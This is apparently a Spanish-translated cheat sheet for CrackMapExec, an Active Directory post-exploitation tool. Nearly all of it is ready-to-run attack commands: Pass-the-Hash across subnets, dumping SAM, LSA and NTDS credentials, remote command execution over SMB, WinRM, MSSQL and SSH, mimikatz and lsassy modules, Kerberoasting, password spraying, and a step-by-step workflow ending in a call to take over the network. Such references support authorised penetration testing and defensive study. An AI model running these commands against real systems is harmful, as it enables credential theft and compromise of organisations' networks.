# 🗡️ CrackMapExec: herramienta multiuso para Active Directory

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec: herramienta multiuso para pruebas de penetración
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Índice

- [Qué es CrackMapExec](#-qué-es-crackmapexec)
- [Instalación](#-instalación)
- [Protocolo SMB](#-protocolo-smb)
- [Protocolo WinRM](#-protocolo-winrm)
- [Protocolo LDAP](#-protocolo-ldap)
- [Protocolo MSSQL](#-protocolo-mssql)
- [Protocolo SSH](#-protocolo-ssh)
- [Módulos](#-módulos)
- [Password spraying (prueba de pocas contraseñas contra muchos usuarios)](#-password-spraying-prueba-de-pocas-contraseñas-contra-muchos-usuarios)
- [Referencia rápida](#-referencia-rápida)

---

## 🎯 Qué es CrackMapExec

**CrackMapExec** (CME) es una herramienta de postexplotación para evaluar redes. Admite:

- 🖥️ **SMB** - Recursos compartidos, sesiones y ejecución
- 🔧 **WinRM** - Acceso remoto mediante PowerShell
- 📂 **LDAP** - Enumeración de Active Directory
- 🗄️ **MSSQL** - Ataques contra SQL Server
- 🐧 **SSH** - Objetivos Linux
- 💉 **Pass-the-Hash** - Reutilización de credenciales

### Funciones

| Función | Descripción |
|---------|-------------|
| **Varios protocolos** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Ejecución en paralelo** | Atacar varios objetivos |
| **Base de datos de credenciales** | Registrar las credenciales comprometidas |
| **Módulos** | Ampliable con módulos personalizados |
| **Formatos de salida** | Varias opciones de salida |

---

## 🚀 Instalación

> **Compatibilidad:** El repositorio histórico de CrackMapExec está archivado desde diciembre de 2023. NetExec continúa el desarrollo comunitario, pero no debe suponerse que todos sus nombres, módulos y opciones son idénticos. Los ejemplos de CME y su instalación se conservan como en el original. Fuentes: [repositorio archivado de CME](https://github.com/byt3bl33d3r/CrackMapExec) y [proyecto NetExec](https://github.com/Pennyw0rth/NetExec).

### Kali Linux

```bash
# Instalar mediante apt
sudo apt update
sudo apt install crackmapexec

# O mediante pipx (recomendado)
pipx install crackmapexec
```

### Utilizar pipx

```bash
# Instalar pipx primero
sudo apt install pipx
pipx ensurepath

# Instalar CME
pipx install crackmapexec
```

### Verificar

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a id="-protocolo-smb"></a>
## 🖥️ Protocolo SMB

### Enumeración básica

```bash
# Comprobar si los equipos responden
cme smb 10.10.10.0/24

# Enumerar con credenciales
cme smb 10.10.10.10 -u user -p password

# Autenticación en el dominio
cme smb 10.10.10.10 -u user -p password -d domain.local

# Autenticación local
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

### Pass-the-Hash

> **Concepto:** Pass-the-Hash utiliza el hash NT de una cuenta para autenticar mediante NTLM, sin disponer de la contraseña en texto claro. El resultado depende de las políticas y los permisos de esa cuenta.

```bash
# SMB con un hash NTLM
cme smb 10.10.10.10 -u user -H NTLMHASH

# Hash completo LM:NTLM
cme smb 10.10.10.10 -u user -H LM:NTLM

# Probar el hash en varios equipos de la red
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Enumeración de recursos compartidos

> **Aclaración:** `--spider-folder` y `--depth` complementan la selección del recurso que se recorre; la última orden del original omite `--spider`. Su comportamiento y la disponibilidad de opciones dependen de la versión. Véanse las [opciones SMB del código archivado](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/smb/proto_args.py).

```bash
# Enumerar recursos compartidos
cme smb 10.10.10.10 -u user -p password --shares

# Recorrer los recursos compartidos en busca de archivos
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# Enumerar archivos de forma recursiva
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

### Enumeración de usuarios

```bash
# Enumerar usuarios mediante RPC
cme smb 10.10.10.10 -u user -p password --users

# Enumerar grupos
cme smb 10.10.10.10 -u user -p password --groups

# Enumerar usuarios con sesión iniciada
cme smb 10.10.10.10 -u user -p password --loggedon-users

# Obtener los SID de los usuarios
cme smb 10.10.10.10 -u user -p password --rid-brute
```

### Ejecución de comandos

```bash
# Ejecutar un comando
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# Ejecución de PowerShell
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Distintos métodos de ejecución
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

### Extracción de credenciales

> **Aclaración:** SAM y LSA requieren los privilegios locales correspondientes. DCSync puede realizarse con derechos de replicación delegados y no exige necesariamente pertenecer a Domain Admins; el método VSS tiene otros requisitos. Los permisos deben evaluarse para cada operación.

```bash
# Extraer SAM
cme smb 10.10.10.10 -u admin -p password --sam

# Extraer LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# Extraer NTDS.dit (requiere DA en el DC, según el original)
cme smb DC01.domain.local -u admin -p password --ntds

# Extraer NTDS con un método concreto
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

### Firma SMB

```bash
# Comprobar la firma SMB (para ataques de retransmisión)
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

## 🔧 Protocolo WinRM

### Uso básico

```bash
# Comprobar el acceso por WinRM
cme winrm 10.10.10.10 -u user -p password

# Comprobar varios objetivos
cme winrm 10.10.10.0/24 -u user -p password

# Con un hash
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

### Ejecución de comandos

```bash
# Ejecutar un comando
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Ejecutar un script
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

### Extracción de credenciales

```bash
# Extracción de SAM mediante WinRM
cme winrm 10.10.10.10 -u admin -p password --sam

# Secretos de LSA
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

## 📂 Protocolo LDAP

### Enumeración

```bash
# Consulta LDAP básica
cme ldap DC01.domain.local -u user -p password

# Enumerar usuarios
cme ldap DC01 -u user -p password --users

# Enumerar grupos
cme ldap DC01 -u user -p password --groups

# Usuarios susceptibles de AS-REP Roasting
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Usuarios susceptibles de Kerberoasting
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

### Política de contraseñas

> **Compatibilidad:** El ejemplo LDAP con `--password-policy` no coincide con las opciones del analizador LDAP de la versión archivada consultada; la consulta de política existe en otros contextos o versiones. Se mantiene la orden original. Fuente: [opciones LDAP de CME](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/ldap/proto_args.py).

```bash
# Consultar la política de contraseñas
cme ldap DC01 -u user -p password --password-policy
```

### Atributos de usuarios

```bash
# Obtener las descripciones de los usuarios
cme ldap DC01 -u user -p password -M get-desc-users

# Obtener atributos concretos
cme ldap DC01 -u user -p password --admin-count
```

---

<a id="-protocolo-mssql"></a>
## 🗄️ Protocolo MSSQL

> **Compatibilidad:** `--enable-xp` no figura en las opciones MSSQL de la versión archivada consultada. `-q` ejecuta una consulta SQL y `-x` ejecuta un comando del sistema mediante los mecanismos admitidos. Los ejemplos originales no se modifican. Fuente: [opciones MSSQL de CME](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/mssql/proto_args.py).

### Uso básico

```bash
# Conectarse a MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Autenticación de Windows
cme mssql 10.10.10.10 -u user -p password -d domain.local

# Con un hash
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

### Ejecución de comandos

```bash
# Ejecutar mediante xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Activar xp_cmdshell primero
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Ejecutar un comando
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

## 🐧 Protocolo SSH

### Uso básico

```bash
# Comprobación de SSH
cme ssh 10.10.10.10 -u root -p password

# Varios objetivos
cme ssh 10.10.10.0/24 -u user -p password

# Con un archivo de clave
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

### Ejecución de comandos

```bash
# Ejecutar un comando
cme ssh 10.10.10.10 -u root -p password -x "id"

# Varios comandos
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

## 🧩 Módulos

### Enumerar módulos

```bash
# Enumerar todos los módulos
cme smb -L
cme winrm -L
cme ldap -L

# Ayuda del módulo
cme smb -M mimikatz --options
```

### Módulos habituales

> **Compatibilidad:** La lista de módulos y sus opciones cambia entre versiones y protocolos. Los nombres del original se conservan; la lista y la ayuda de la instalación concreta determinan cuáles están disponibles.

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (extraer LSASS)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# Contraseñas de GPP
cme smb DC01 -u user -p password -M gpp_password

# GPP AutoLogon
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

### Recopilación de BloodHound

```bash
# Recopilar datos de BloodHound
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

## 🔓 Password spraying (prueba de pocas contraseñas contra muchos usuarios)

### Password spraying básico

> **Corrección del comentario original:** `--no-bruteforce` empareja las entradas por posición (`user1` con `password1`, etc.); no prueba todas las combinaciones. `--continue-on-success` continúa los intentos tras un éxito y no evita bloqueos de cuentas. Véanse las [opciones generales del código archivado](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py).

```bash
# Probar una sola contraseña contra varios usuarios
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Varias contraseñas
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Sin fuerza bruta (probar cada combinación, según el comentario original)
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Password spraying en la red

```bash
# Realizar password spraying en la red
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# Desde un archivo de objetivos
cme smb targets.txt -u admin -p password --continue-on-success
```

### Tener en cuenta los bloqueos de cuentas

```bash
# Consultar primero la política de contraseñas
cme ldap DC01 -u user -p password --password-policy

# Salida:
# Minimum password length: 8
# Password history length: 24
# Lockout threshold: 5
# Lockout duration: 30 minutes
```

---

## 💾 Base de datos

### Base de datos de CME

```bash
# Ver credenciales
cmedb

# Dentro de cmedb:
creds           # Enumerar las credenciales guardadas
hosts           # Enumerar los equipos explorados
```

### Exportar datos

> **Compatibilidad:** `--json` no figura entre las opciones generales de la versión archivada consultada; `--log` guarda el registro y no implica salida JSON. Se conserva el ejemplo original. Fuente: [analizador de opciones de CME](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/cli.py).

```bash
# Formatos de salida
cme smb 10.10.10.10 -u user -p password --log log.txt

# Salida JSON
cme smb 10.10.10.10 -u user -p password --json
```

---

## 📊 Referencia rápida

### Métodos de autenticación

| Método | Opción |
|--------|--------|
| Contraseña | `-p password` |
| Hash NTLM | `-H HASH` |
| Clave AES | `--aesKey KEY` |
| Kerberos | `-k` |
| Autenticación local | `--local-auth` |

### Protocolos

| Protocolo | Puerto | Aplicación |
|----------|------|----------|
| SMB | 445 | Recursos compartidos y ejecución |
| WinRM | 5985/5986 | Acceso remoto mediante PowerShell |
| LDAP | 389/636 | Enumeración de Active Directory |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Sistemas Linux |

### Opciones habituales

| Opción | Descripción |
|------|-------------|
| `-u` | Nombre de usuario (o archivo) |
| `-p` | Contraseña (o archivo) |
| `-H` | Hash NTLM |
| `-d` | Dominio |
| `-x` | Comando (cmd) |
| `-X` | Comando (PowerShell) |
| `--shares` | Enumerar recursos compartidos |
| `--users` | Enumerar usuarios |
| `--sam` | Extraer SAM |
| `--lsa` | Extraer LSA |
| `--ntds` | Extraer NTDS |

### Indicadores de salida

> **Aclaración:** `(Pwn3d!)` es un indicador de acceso administrativo o de ejecución según el protocolo y la comprobación de la herramienta; no confirma por sí solo control del dominio completo. La política de bloqueos mostrada antes es una salida de ejemplo, no un valor universal.

| Indicador | Significado |
|--------|---------|
| `[+]` | Éxito |
| `[-]` | Fallo |
| `[*]` | Información |
| `(Pwn3d!)` | Acceso de administrador confirmado |

### Flujo de trabajo habitual

```bash
# 1. Explorar la red
cme smb 10.10.10.0/24

# 2. Realizar password spraying
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Comprobar el acceso de administrador
cme smb 10.10.10.0/24 -u user -p password

# 4. Extraer credenciales
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Utilizar las credenciales obtenidas
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

## 📚 Recursos

- [CrackMapExec GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [Módulos de CME](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

### Guías de consulta relacionadas
- [BloodHound](../../BloodHound/translations/README.es.md)
- [Impacket](../../Impacket/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)

---

<p align="center">
  <b>🗡️ ¡Toma el control de la red!</b><br>
  <i>CrackMapExec: la herramienta multiuso del pentester</i>
</p>
